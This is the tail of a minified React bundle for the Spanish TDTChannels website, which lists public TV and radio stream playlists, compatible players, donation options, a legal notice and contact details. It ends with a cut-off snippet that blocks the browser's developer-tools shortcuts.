                            }, l.a.createElement("h4", null, "TiviMate"), l.a.createElement("b", null, "Formato de listas compatibles"), ": Todas las del proyecto ya est\xe1n incluidas.", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://play.google.com/store/apps/details?id=ar.tvplayer.tv&hl=es",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Google Play"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "El usuario cansat ha hecho un tutorial para poder disfrutar de esta lista en Fire Stick.", " ", l.a.createElement("a", {
                                href: "https://telegra.ph/IPTV-en-kodi-y-en-fire-lista-de-canales-de-TDT-gratuitos-11-26",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "TDTChannels en Firestick con TiviMate.")))), l.a.createElement("div", {
                                className: "subsection"
                            }, l.a.createElement("h3", null, "WebOS"), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "SSIPTV"), l.a.createElement("div", {
                                className: "description"
                            }, l.a.createElement("a", {
                                href: "https://www.achotv.com/ssiptv.php",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Info aqu\xed"), " ", "para conocer como incluir las listas en este programa.")), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "OttPlayer"), l.a.createElement("div", {
                                className: "description"
                            }, l.a.createElement("a", {
                                href: "https://ottplayer.es/",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Info aqu\xed."))), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "SmartIPTV"))), l.a.createElement("div", {
                                className: "subsection"
                            }, l.a.createElement("h3", null, "Chromecast"), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "gse"), l.a.createElement("div", {
                                className: "description"
                            }, l.a.createElement("a", {
                                href: "https://play.google.com/store/apps/details?id=com.gsetech.smartiptv&hl=es",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Info aqu\xed."))), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "IPTV Extreme"), l.a.createElement("div", {
                                className: "description"
                            }, l.a.createElement("a", {
                                href: "https://play.google.com/store/apps/details?id=com.pecana.iptvextreme&hl=es",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Info aqu\xed."))), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "Wiseplay"), l.a.createElement("div", {
                                className: "description"
                            }, l.a.createElement("a", {
                                href: "https://play.google.com/store/apps/details?id=com.wiseplay&hl=es",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Info aqu\xed.")))))
                        }
                    }]), t
                }(n.Component),
                Te = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t() {
                        return Object(s.a)(this, t), a.apply(this, arguments)
                    }
                    return Object(c.a)(t, [{
                        key: "render",
                        value: function() {
                            return l.a.createElement("div", {
                                className: "section"
                            }, l.a.createElement("h2", null, "Otros"), "Los enlaces y las listas funcionan por defecto en cualquier reproductor. Pero a continuaci\xf3n os dejamos los m\xe1s utilizados.", l.a.createElement("div", {
                                className: "subsection"
                            }, l.a.createElement("h3", null, "Enigma2"), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "Plugin Jungle Team"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, ".tv"), l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("div", {
                                className: "description"
                            }, "Jungle Team nos proporciona un plugin para Enigma2. Facilita la instalaci\xf3n de todo lo necesario para reproducir el proyecto en esta plataforma.", l.a.createElement("br", null), l.a.createElement("a", {
                                href: "https://jungle-team.com/plugins-tdtchannels-enigma2/",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Plugin TDTChannels - Enigma2."))), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "Opci\xf3n 2"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, ".tv"), l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("div", {
                                className: "description"
                            }, "El usuario 'Insti' ha realizado un tutorial para hacer funcionar esta lista en un decodificador Linux Enigma2. Adem\xe1s de c\xf3mo introducir el EPG en \xe9l. ", l.a.createElement("br", null), l.a.createElement("a", {
                                href: "https://youtu.be/43buRFVlqJc",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "IPTV TDTChannels en Enigma2."))), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "Opci\xf3n 3"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, ".tv"), l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("div", {
                                className: "description"
                            }, "El usuario 'EA4GNQ' ha realizado un tutorial para hacer funcionar esta lista en un decodificador Linux Enigma2. Adem\xe1s de c\xf3mo introducir el EPG en \xe9l. ", l.a.createElement("br", null), l.a.createElement("a", {
                                href: "https://telegra.ph/IPTV-TDTChannels-en-enigma2-03-13",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "IPTV TDTChannels en Enigma2.")))), l.a.createElement("div", {
                                className: "subsection"
                            }, l.a.createElement("h3", null, "Tvheadend + Synology"), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, ".m3u8"), l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("div", {
                                className: "description"
                            }, "El usuario 'ferpar' ha realizado un tutorial para hacer funcionar esta lista en un TVHeadend instalado en un NAS de Synology. ", l.a.createElement("br", null), l.a.createElement("a", {
                                href: "https://leemefer.blogspot.com/2019/08/iptv-tvheadend-synology.html",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "TDTChannels con TVHeadend y Synology.")))))
                        }
                    }]), t
                }(n.Component);

            function Ce(e) {
                var a = e.children,
                    t = e.value,
                    n = e.index,
                    r = Object(pe.a)(e, ["children", "value", "index"]);
                return l.a.createElement(W.a, Object.assign({
                    component: "div",
                    role: "tabpanel",
                    hidden: t !== n,
                    id: "simple-tabpanel-".concat(n),
                    "aria-labelledby": "simple-tab-".concat(n)
                }, r), t === n && l.a.createElement(ge.a, {
                    p: 3
                }, a))
            }
            var ke = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t(e) {
                        var n;
                        return Object(s.a)(this, t), (n = a.call(this, e)).handleChange = function(e, a) {
                            n.setState({
                                currentTab: a
                            })
                        }, n.state = {
                            currentTab: 0
                        }, n
                    }
                    return Object(c.a)(t, [{
                        key: "componentDidMount",
                        value: function() {}
                    }, {
                        key: "a11yProps",
                        value: function(e) {
                            return {
                                id: "simple-tab-".concat(e),
                                "aria-controls": "simple-tabpanel-".concat(e)
                            }
                        }
                    }, {
                        key: "render",
                        value: function() {
                            return l.a.createElement(me.a, {
                                style: {
                                    paddingTop: "20px",
                                    paddingBottom: "30px"
                                }
                            }, l.a.createElement("h1", null, "Otras plataformas"), l.a.createElement("p", null, "Si deseas utilizar esta plataforma en otro sistema, que no es ni v\xeda navegador ni v\xeda Android, en esta p\xe1gina encontrar\xe1s informaci\xf3n de los sistemas en los que actualmente somos compatibles."), l.a.createElement(Ee.a, {
                                position: "static",
                                style: {
                                    backgroundColor: "#4d5ec1"
                                }
                            }, l.a.createElement(be.a, {
                                value: this.state.currentTab,
                                onChange: this.handleChange,
                                "aria-label": "simple tabs example"
                            }, l.a.createElement(he.a, Object.assign({
                                label: "Android"
                            }, this.a11yProps(0))), l.a.createElement(he.a, Object.assign({
                                label: "iOS"
                            }, this.a11yProps(1))), l.a.createElement(he.a, Object.assign({
                                label: "Ordenador"
                            }, this.a11yProps(2))), l.a.createElement(he.a, Object.assign({
                                label: "Smart TV"
                            }, this.a11yProps(3))), l.a.createElement(he.a, Object.assign({
                                label: "Otros"
                            }, this.a11yProps(4))))), l.a.createElement(Ce, {
                                value: this.state.currentTab,
                                index: 0
                            }, l.a.createElement(ve, null)), l.a.createElement(Ce, {
                                value: this.state.currentTab,
                                index: 1
                            }, l.a.createElement(ye, null)), l.a.createElement(Ce, {
                                value: this.state.currentTab,
                                index: 2
                            }, l.a.createElement(fe, null)), l.a.createElement(Ce, {
                                value: this.state.currentTab,
                                index: 3
                            }, l.a.createElement(we, null)), l.a.createElement(Ce, {
                                value: this.state.currentTab,
                                index: 4
                            }, l.a.createElement(Te, null)))
                        }
                    }]), t
                }(l.a.Component),
                Oe = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t(e) {
                        var n;
                        return Object(s.a)(this, t), (n = a.call(this, e)).state = {}, n
                    }
                    return Object(c.a)(t, [{
                        key: "componentDidMount",
                        value: function() {}
                    }, {
                        key: "renderList",
                        value: function(e, a) {
                            var t = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
                            return l.a.createElement("div", null, l.a.createElement("a", {
                                href: a,
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, e), " ", t && "- " + a)
                        }
                    }, {
                        key: "render",
                        value: function() {
                            return l.a.createElement(me.a, {
                                style: {
                                    paddingTop: "20px"
                                }
                            }, l.a.createElement("h1", null, "Listas oficiales del proyecto"), l.a.createElement("p", null, "A continuaci\xf3n ten\xe9is las listas del proyecto que se encuentran disponibles actualmente. Estas listas se actualizan autom\xe1ticamente cuando se da el aviso en Telegram. Prioriza enlazarlas en tu programa deseado antes que descargarlas y cargarlas manualmente."), l.a.createElement("b", null, "Debido a restricciones de las cadenas emisoras, no todas las listas contienen los mismos canales, m\xe1s informaci\xf3n en", " "), l.a.createElement("a", {
                                href: "http://tdtchannels.com/status",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Estado e informaci\xf3n de los canales"), ".", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h2", null, "Listas de televisi\xf3n"), this.renderList("Navegador", "https://github.com/LaQuay/TDTChannels/blob/master/television.html.md", !1), "Usa este enlace si deseas echar un ojo a la fuente del proyecto. Es Open Source, puedes colaborar!", l.a.createElement("br", null), l.a.createElement("br", null), this.renderList("JSON", "https://www.tdtchannels.com/lists/tv.json"), "Usa este enlace si deseas utilizar la aplicaci\xf3n TDTChannels para iOS.", l.a.createElement("br", null), l.a.createElement("br", null), this.renderList("M3U8", "https://www.tdtchannels.com/lists/tv.m3u8"), "Usa este enlace si deseas utilizar cualquier aplicaci\xf3n IPTV gen\xe9rica.", l.a.createElement("br", null), l.a.createElement("br", null), this.renderList("M3U", "https://www.tdtchannels.com/lists/tv.m3u"), "Usa este enlace si deseas utilizar cualquier aplicaci\xf3n IPTV gen\xe9rica. Utilizala s\xf3lo si la M3U8 no te funciona.", l.a.createElement("br", null), l.a.createElement("br", null), this.renderList("M3U8 + MPD", "https://www.tdtchannels.com/lists/tv_mpd.m3u8"), l.a.createElement("i", null, "En pruebas"), " Incluye los mismos canales que la M3U8, pero adem\xe1s los que emiten en formato MPD. Revisa la compatibilidad en la parte inferior de esta p\xe1gina web.", l.a.createElement("br", null), l.a.createElement("br", null), this.renderList("Enigma2", "https://www.tdtchannels.com/lists/userbouquet.tdtchannels.tv"), l.a.createElement("br", null), this.renderList("W3U", "https://www.tdtchannels.com/lists/tv.w3u"), "Usa este enlace si deseas utilizarla en Wiseplay.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h2", null, "Listas de radio"), this.renderList("Navegador", "https://github.com/LaQuay/TDTChannels/blob/master/RADIO.md", !1), "Usa este enlace si deseas echar un ojo a la fuente del proyecto. Es Open Source, puedes colaborar!", l.a.createElement("br", null), l.a.createElement("br", null), this.renderList("JSON", "https://www.tdtchannels.com/lists/radio.json"), l.a.createElement("br", null), this.renderList("M3U8", "https://www.tdtchannels.com/lists/radio.m3u8"), l.a.createElement("br", null), this.renderList("M3U", "https://www.tdtchannels.com/lists/radio.m3u"), l.a.createElement("br", null), this.renderList("Enigma2", "https://www.tdtchannels.com/lists/userbouquet.tdtchannels_radio.tv"), l.a.createElement("br", null), this.renderList("W3U", "https://www.tdtchannels.com/lists/radio.w3u"), l.a.createElement("br", null), l.a.createElement("h2", null, "Listas combinadas"), this.renderList("M3U8", "https://www.tdtchannels.com/lists/tvradio.m3u8"), l.a.createElement("br", null), this.renderList("M3U", "https://www.tdtchannels.com/lists/tvradio.m3u"), l.a.createElement("br", null), this.renderList("M3U8 + MPD", "https://www.tdtchannels.com/lists/tvradio_mpd.m3u8"), l.a.createElement("br", null), this.renderList("Enigma2", "https://www.tdtchannels.com/lists/userbouquet.tdtchannels_combo.tv"), l.a.createElement("br", null), this.renderList("W3U", "https://www.tdtchannels.com/lists/tvradio.w3u"), l.a.createElement("br", null), l.a.createElement("h2", null, "EPG"), this.renderList("Navegador", "https://github.com/HelmerLuzo/TDTChannels_EPG", !1), "Usa este enlace si deseas echar un ojo a la fuente del proyecto. Gracias al gran trabajo de HelmerLuzo!", l.a.createElement("br", null), l.a.createElement("br", null), this.renderList("xml", "https://www.tdtchannels.com/epg/TV.xml"), l.a.createElement("br", null), this.renderList("xml gz", "https://www.tdtchannels.com/epg/TV.xml.gz"), l.a.createElement("br", null), l.a.createElement("h2", null, "\xbfD\xf3nde funciona la lista M3U8+MPD?"), "- VLC 3 para Windows ", l.a.createElement("br", null), "- Wiseplay para Android IPTV 3U para Android ", l.a.createElement("br", null), "- Web video caster para Android ", l.a.createElement("br", null), "- IPTV Pro, para Android ", l.a.createElement("br", null), "- IPTV Pro, con VLC, para Android ", l.a.createElement("br", null), "- GSE IPTV, con VLC, para Android ", l.a.createElement("br", null), "- Tivimate, para Android TV ", l.a.createElement("br", null), "- VidLib, para iOS ", l.a.createElement("br", null), "- CloudStream, para Apple ", l.a.createElement("br", null), l.a.createElement("br", null), "No funciona: ", l.a.createElement("br", null), "- IPTV Pro, con MX PRO, para Android ", l.a.createElement("br", null), "- IPTV 3 U, con ffmpeg, para Android ", l.a.createElement("br", null), "- GSE IPTV para Android y iOS ", l.a.createElement("br", null), "- KODI para Linux ", l.a.createElement("br", null), "- Smart IPTV para Samsung", l.a.createElement("br", null), l.a.createElement("br", null))
                        }
                    }]), t
                }(l.a.Component),
                Ne = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t(e) {
                        var n;
                        return Object(s.a)(this, t), (n = a.call(this, e)).state = {}, n
                    }
                    return Object(c.a)(t, [{
                        key: "componentDidMount",
                        value: function() {}
                    }, {
                        key: "render",
                        value: function() {
                            return l.a.createElement(me.a, {
                                style: {
                                    paddingTop: "20px"
                                }
                            }, l.a.createElement("h1", null, "\xbfNecesitas ayuda?"), l.a.createElement("p", null, "Hemos preparado una Wiki para ayudarte, la puedes encontrar aqu\xed temporalmente."), l.a.createElement("a", {
                                href: "https://github.com/LaQuay/TDTChannels/wiki",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "TDTChannels - Wiki en GitHub"), l.a.createElement("br", null), l.a.createElement("br", null), "Tambi\xe9n puedes unirte a", " ", l.a.createElement("a", {
                                href: "https://t.me/tdtchannels",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "nuestro Telegram"), " ", "y estar informado constantemente del proyecto.")
                        }
                    }]), t
                }(l.a.Component),
                je = t(239),
                xe = t(240),
                Se = t(241),
                Ae = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t(e) {
                        var n;
                        return Object(s.a)(this, t), (n = a.call(this, e)).state = {}, n
                    }
                    return Object(c.a)(t, [{
                        key: "componentDidMount",
                        value: function() {}
                    }, {
                        key: "render",
                        value: function() {
                            return l.a.createElement(me.a, {
                                style: {
                                    paddingTop: "20px"
                                }
                            }, l.a.createElement(v.a, {
                                container: !0,
                                spacing: 2,
                                style: {
                                    height: "100%"
                                }
                            }, l.a.createElement(v.a, {
                                item: !0,
                                xs: 12,
                                sm: 12,
                                md: 12,
                                lg: 8,
                                style: {
                                    minWidth: "375px"
                                }
                            }, l.a.createElement("h1", null, "\xa1Colabora con el proyecto!"), "Hola! ", l.a.createElement(S, {
                                symbol: "\ud83d\ude03",
                                label: "cara sonriente"
                            }), l.a.createElement("p", null, "Este proyecto es totalmente gratuito y cuya intenci\xf3n es la de poder transmitir de forma m\xe1s sencilla y mediante Internet, la se\xf1al de aquellas emisoras de televisi\xf3n p\xfablica que emitan por este medio. Espero que TDTChannels te est\xe9 siendo de utilidad. Si lo deseas, aqu\xed te explicamos c\xf3mo puedes colaborar con el proyecto. Gracias! ", l.a.createElement(S, {
                                symbol: "\ud83d\ude03",
                                label: "cara sonriente"
                            })), l.a.createElement("h2", null, "\xbfC\xf3mo puedo contribuir?"), l.a.createElement("p", null, "Si te gusta el proyecto y deseas apoyarnos tienes dos opciones de contribuci\xf3n:", l.a.createElement("br", null), l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Ayudando al mantenimiento de canales"), l.a.createElement("br", null), "\xbfTienes alg\xfan canal que proponer? \xbfAlguna mejora que poder aplicar? La fuente de datos es de c\xf3digo abierto, as\xed que est\xe1 abierta a propuestas!", l.a.createElement("br", null), l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Ayudando mediante donaciones econ\xf3micas"), l.a.createElement("br", null), "Al realizar una donaci\xf3n. Contribuir\xe1s a que este proyecto siga vivo y directamente estar\xe1s ayudando a mantener todo el ecosistema del mismo, incluyendo el servidor y dominio web, el mantenimiento de las listas, la aplicaci\xf3n Android, etc. De esta forma, este proyecto podr\xe1 seguir funcionando ofreciendo contenido gratuito, sin publicidad."), l.a.createElement("h4", null, "V\xeda Ko-fi (PayPal o tarjeta de cr\xe9dito)"), l.a.createElement("p", null, "Aceptamos donaciones a trav\xe9s de Ko-fi. Una plataforma para donar a desarrolladores. Permite donar a trav\xe9s de PayPal o tarjeta bancaria en un par de clicks, de forma totalmente segura."), l.a.createElement("a", {
                                href: "https://ko-fi.com/mlaquay",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Haz click aqu\xed para ir a la plataforma Ko-fi"), ". Desde ah\xed podr\xe1s colaborar. Aunque tambi\xe9n aqu\xed abajo puedes encontrar un acceso directo para colaborar.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("iframe", {
                                src: "https://ko-fi.com/mlaquay/?hidefeed=true&widget=true&embed=true&preview=true",
                                style: {
                                    border: "none",
                                    width: "100%",
                                    height: "700px",
                                    padding: "4px",
                                    background: "#f9f9f9"
                                },
                                title: "donate-kofi"
                            }), l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("strike", null, l.a.createElement("h4", null, "V\xeda BuyMeACoffee")), l.a.createElement("p", null, "Antigua forma de donaciones, ya en desuso. Por favor, dona a trav\xe9s de Ko-fi. Gracias!"), l.a.createElement("br", null), l.a.createElement("h4", null, "V\xeda BTC"), l.a.createElement("code", null, "1Ar5csqnzUWd7YY4YoKRQ1788EjeVrkNvA"), l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "Otras formas"), l.a.createElement("p", null, "Si tienes alguna duda, o quieres utilizar otro m\xe9todo cont\xe1ctame por", " ", l.a.createElement("a", {
                                href: "https://t.me/LaQuay",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Telegram"), "."), l.a.createElement("br", null)), l.a.createElement(v.a, {
                                item: !0,
                                xs: 12,
                                sm: 12,
                                md: 12,
                                lg: 4,
                                style: {
                                    minWidth: "375px"
                                }
                            }, l.a.createElement(je.a, null, l.a.createElement(xe.a, null, l.a.createElement(W.a, {
                                variant: "h5",
                                component: "h2",
                                gutterBottom: !0
                            }, "Colaboradores principales del proyecto"), l.a.createElement(W.a, {
                                color: "textSecondary"
                            }, "Autor"), l.a.createElement(W.a, {
                                variant: "body2",
                                component: "p",
                                gutterBottom: !0
                            }, "Marc (@LaQuay)"), l.a.createElement(W.a, {
                                color: "textSecondary"
                            }, "Equipo"), l.a.createElement(W.a, {
                                variant: "body2",
                                component: "p",
                                gutterBottom: !0
                            }, "Antonio (@atnbueno) ", l.a.createElement("br", null), "@HelmerLuzo ", l.a.createElement("br", null), "@Nomentero ", l.a.createElement("br", null)), l.a.createElement(W.a, {
                                color: "textSecondary"
                            }, "Colaboradores"), l.a.createElement(W.a, {
                                variant: "body2",
                                component: "p",
                                gutterBottom: !0
                            }, "Jabi (@Jabiru) ", l.a.createElement("br", null), "Jacobo (@jako88) ", l.a.createElement("br", null), "Paco (@PacoDevelop) ", l.a.createElement("br", null), "@playzzz"), l.a.createElement("br", null), l.a.createElement(W.a, {
                                variant: "body2",
                                component: "p"
                            }, "Y m\xe1s que pueden encontrarse en GitHub. GRACIAS!")), l.a.createElement(Se.a, null, l.a.createElement(y.a, {
                                href: "https://github.com/LaQuay/TDTChannels/blob/master/AUTHORS.md",
                                size: "small",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Saber M\xe1s"))))))
                        }
                    }]), t
                }(l.a.Component),
                Pe = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t(e) {
                        var n;
                        return Object(s.a)(this, t), (n = a.call(this, e)).state = {}, n
                    }
                    return Object(c.a)(t, [{
                        key: "componentDidMount",
                        value: function() {}
                    }, {
                        key: "render",
                        value: function() {
                            return l.a.createElement(me.a, {
                                style: {
                                    paddingTop: "20px"
                                }
                            }, l.a.createElement("h1", null, "Aviso Legal"), l.a.createElement("p", null, "Las emisiones son oficiales y conectan directamente con el proveedor oficial del servicio. No almacenamos ni modificamos ning\xfan contenido y todo se reproduce directamente desde el sitio del emisor. Por lo que puedes estar tranquilo que no est\xe1s cometiendo ninguna irregularidad."), l.a.createElement("p", null, "Los puntos 1, 2, 3, se aplican tambi\xe9n a la Aplicaci\xf3n Android. Esta, adem\xe1s, tiene un apartado dedicado para incluir m\xe1s t\xe9rminos legales."), l.a.createElement("p", null, 'En adelante, "el proyecto", referencia al mismo tiempo esta p\xe1gina web, como la aplicaci\xf3n Android.'), l.a.createElement("h2", null, "1. Condiciones de uso"), l.a.createElement("p", null, "El proyecto est\xe1 dise\xf1ado \xfanicamente para comprobar el funcionamiento de los canales enlazados en el repositorio. Queda fuera del objetivo alg\xfan otro uso. El usuario es el \xfanico responsable del uso que se le da al proyecto. ", l.a.createElement("br", null), l.a.createElement("br", null), "Toda persona que acceda al proyecto asume el papel de usuario, comprometi\xe9ndose a la observancia y cumplimiento riguroso de las disposiciones aqu\xed dispuestas, as\xed como a cualquier otra disposici\xf3n legal que fuera de aplicaci\xf3n. El proyecto se exime de cualquier tipo de responsabilidad derivada de la informaci\xf3n publicada en \xe9l y por la falta de disponibilidad (ca\xeddas) del servidor, el cual, podr\xe1 efectuar paradas peri\xf3dicas por mantenimientos t\xe9cnicos. Adem\xe1s, el proyecto se reserva el derecho a modificar cualquier tipo de informaci\xf3n que pudiera aparecer en \xe9l, sin que exista obligaci\xf3n de pre-avisar o poner en conocimiento de los usuarios dichas obligaciones."), l.a.createElement("h2", null, "2. Ley de propiedad intelectual"), l.a.createElement("p", null, "El proyecto no almacena ning\xfan stream, \xfanicamente enlaces web que proporciona el mismo distribuidor de la emisi\xf3n de forma oficial, mediante su propia web o servicio p\xfablico. Adem\xe1s no se emite ni emitir\xe1, transmite o transmitir\xe1 nunca ning\xfan tipo de se\xf1al p\xfablica o privada desde sus servidores. El proyecto se limita a ofrecer emisiones p\xfablicas, las cuales son proporcionadas por el mismo distribuidor, canal o grupo de televisi\xf3n de forma oficial, mediante su propia web o servicio p\xfablico.", l.a.createElement("br", null), " ", l.a.createElement("br", null), "Los derechos de emisi\xf3n, retransmisi\xf3n, distribuci\xf3n y contenido son propiedad y responsabilidad exclusiva de los operadores, grupos y empresas de televisi\xf3n y/o radio encargadas de su distribuci\xf3n.", l.a.createElement("br", null), " ", l.a.createElement("br", null), "El proyecto no asumir\xe1 responsabilidad alguna respecto a los derechos de propiedad intelectual o industrial titularidad de terceros que se vean infringidos por un tercero o por cualquier usuario."), l.a.createElement("h2", null, "3. Vida del proyecto y garant\xeda"), l.a.createElement("p", null, "Conforme a los t\xe9rminos y condiciones de este aviso legal, as\xed como de las Condiciones de uso, el proyecto se reserva el derecho unilateral de suspender temporalmente o de terminar definitivamente la prestaci\xf3n de servicios a trav\xe9s de cualquier plataforma, as\xed como de suspender temporal o definitivamente el servicio completamente."), l.a.createElement("h2", null, "4. Aplicaci\xf3n Android"), l.a.createElement("p", null, "La aplicaci\xf3n Android TDTChannels se distribuye de forma totalmente gratuita, para uso personal. No se permite su uso comercial. Para uso comercial, previamente, se ha de obtener la licencia de TDTChannels, contacta antes de utilizarla."), l.a.createElement("br", null), l.a.createElement("p", null, "El equipo de TDTChannels"))
                        }
                    }]), t
                }(l.a.Component),
                De = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t(e) {
                        var n;
                        return Object(s.a)(this, t), (n = a.call(this, e)).state = {}, n
                    }
                    return Object(c.a)(t, [{
                        key: "componentDidMount",
                        value: function() {}
                    }, {
                        key: "render",
                        value: function() {
                            return l.a.createElement(me.a, {
                                style: {
                                    paddingTop: "20px"
                                }
                            }, l.a.createElement("h1", null, "Contacto"), l.a.createElement("p", null, "Si necesitas ponerte en contacto con nosotros o tienes alguna duda, sugerencia o reclamaci\xf3n, puedes utilizar uno de los siguientes m\xe9todos."), l.a.createElement("h2", null, "Telegram"), l.a.createElement("p", null, "En nuestro grupo p\xfablico,", " ", l.a.createElement("a", {
                                href: "https://t.me/tdtchannels",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "TDTChannels"), ". Cuenta con m\xe1s de 8000 miembros, ah\xed puedes plantear tu duda de forma p\xfablica. Pero recuerda revisar si antes se ha hablado acerca de tu duda."), l.a.createElement("p", null, "En nuestro canal p\xfablico,", " ", l.a.createElement("a", {
                                href: "https://t.me/tdtchannels_avisos",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "TDTChannels"), ". D\xf3nde podr\xe1s estar al d\xeda de las \xfaltimas novedades de la plataforma."), l.a.createElement("h2", null, "Email"), l.a.createElement("a", {
                                href: "mailto: hola@tdtchannels.com"
                            }, "hola@tdtchannels.com"), l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h3", null, "Contacto personal"), l.a.createElement("p", null, "Puedes encontrarme en Telegram,", " ", l.a.createElement("a", {
                                href: "https://t.me/LaQuay",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "@LaQuay"), ", intentar\xe9 responder lo antes posible."))
                        }
                    }]), t
                }(l.a.Component),
                Le = (t(112), function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t() {
                        return Object(s.a)(this, t), a.apply(this, arguments)
                    }
                    return Object(c.a)(t, [{
                        key: "render",
                        value: function() {
                            return l.a.createElement(f.d, null, l.a.createElement(f.b, {
                                path: "/",
                                component: se,
                            }), l.a.createElement(f.b, {
                                path: "/television.html",
                                component: se
                            }), l.a.createElement(f.b, {
                                path: "/television.html",
                                component: se
                            }), l.a.createElement(f.b, {
                                path: "/radio.html",
                                component: ce
                            }), l.a.createElement(f.b, {
                                path: "/android",
                                component: ue
                            }), l.a.createElement(f.b, {
                                path: "/carta/index.html",
                                component: ue
                            }), l.a.createElement(f.b, {
                                path: "/iphone",
                                component: de
                            }), l.a.createElement(f.b, {
                                path: "/otrasplataformas",
                                component: ke
                            }), l.a.createElement(f.b, {
                                path: "/listas",
                                component: Oe
                            }), l.a.createElement(f.b, {
                                path: "/ayuda",
                                component: Ne
                            }), l.a.createElement(f.b, {
                                path: "/colabora",
                                component: Ae
                            }), l.a.createElement(f.b, {
                                path: "/avisolegal",
                                component: Pe
                            }), l.a.createElement(f.b, {
                                path: "/acercade",
                                component: De
                            }), l.a.createElement(f.b, {
                                path: "*"
                            }, l.a.createElement(f.a, {
                                to: "/"
                            })))
                        }
                    }]), t
                }(n.Component)),
                _e = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t() {
                        return Object(s.a)(this, t), a.apply(this, arguments)
                    }
                    return Object(c.a)(t, [{
                        key: "render",
                        value: function() {
                            return l.a.createElement("div", {
                                className: "app-content"
                            }, l.a.createElement(d.a, null, l.a.createElement(g, null), l.a.createElement(Le, null)))
                        }
                    }]), t
                }(n.Component);
            Boolean("localhost" === window.location.hostname || "[::1]" === window.location.hostname || window.location.hostname.match(/^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));
            i.a.initialize("UA-27327609-3"), i.a.pageview(window.location.pathname + window.location.search), o.a.render(l.a.createElement(_e, null), document.getElementById("root")), "serviceWorker" in navigator && navigator.serviceWorker.ready.then((function(e) {
                e.unregister()
            })).catch((function(e) {
                console.error(e.message)
            }))
        },
        69: function(e, a, t) {},
        91: function(e, a, t) {}
    },
    [
        [132, 1, 2]
    ]
]);


document.onkeydown = function(e) {
    if(event.keyCode == 123) {
       return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
       return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
       return false;
    }
